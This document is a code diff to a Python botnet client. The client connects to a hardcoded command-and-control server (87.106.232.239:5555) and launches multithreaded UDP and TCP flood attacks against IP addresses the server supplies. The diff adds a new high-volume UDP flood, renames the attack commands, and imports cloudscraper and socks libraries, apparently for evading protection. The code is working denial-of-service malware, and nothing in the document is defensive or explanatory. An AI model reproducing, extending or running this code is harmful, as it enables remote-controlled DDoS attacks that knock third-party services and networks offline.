@@ -1,10 +1,11 @@
-import socket, threading, time, random, requests
+import socket, threading, time, random, cloudscraper, requests
 import os
 import shutil
 import sys
 import subprocess
 from requests.exceptions import SSLError, Timeout
-
+import socks
+import sys
 
 C2_ADDRESS  = "87.106.232.239"
 C2_PORT     = 5555
@@ -42,7 +43,10 @@ def attack_tcp(ip, port, end_time, size):
             s.close()
 
 
+
 #layer 4 normal attacks
+
+
 
 
 
@@ -93,7 +97,24 @@ def attack_tcp_bypass(ip, port, end_time, size):
 
 
 
+# other attacks
 
+
+def attack_udp_gbps(ip, port, end_time, size):
+    while time.time() < end_time:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            dport = random.randint(1, 65535) if port == 0 else port
+            while time.time() < end_time:
+                data = os.urandom(size)
+                s.sendto(data, (ip, dport))
+                s.sendto(data, (ip, dport))
+                s.sendto(data, (ip, dport))
+        except Exception as e:
+            print("Error:", e)
+            continue
+        finally:
+            s.close()
     
 
 
@@ -135,7 +156,7 @@ def main():
                 args = data.split(' ')
                 command = args[0].upper()
 
-                if command == '!UDP-RAW':
+                if command == '!UDP':
                     ip = args[1]
                     port = int(args[2])
                     duration = int(args[3])
@@ -145,7 +166,7 @@ def main():
 
                     for _ in range(threads):
                         threading.Thread(target=attack_udp, args=(ip, port, end_time, size), daemon=True).start()
-                if command == '!TCP-RAW':
+                if command == '!TCP':
                     ip = args[1]
                     port = int(args[2])
                     duration = int(args[3])
@@ -175,6 +196,16 @@ def main():
 
                     for _ in range(threads):
                         threading.Thread(target=attack_tcp_bypass, args=(ip, port, end_time, size), daemon=True).start()
+                if command == '!UDP-GBPS':
+                    ip = args[1]
+                    port = int(args[2])
+                    duration = int(args[3])
+                    end_time = time.time() + duration
+                    size = 65500
+                    threads = 20
+
+                    for _ in range(threads):
+                        threading.Thread(target=attack_udp_gbps, args=(ip, port, end_time, size), daemon=True).start()
                 elif command == 'PING':
                     c2.send('PONG'.encode())
             except:
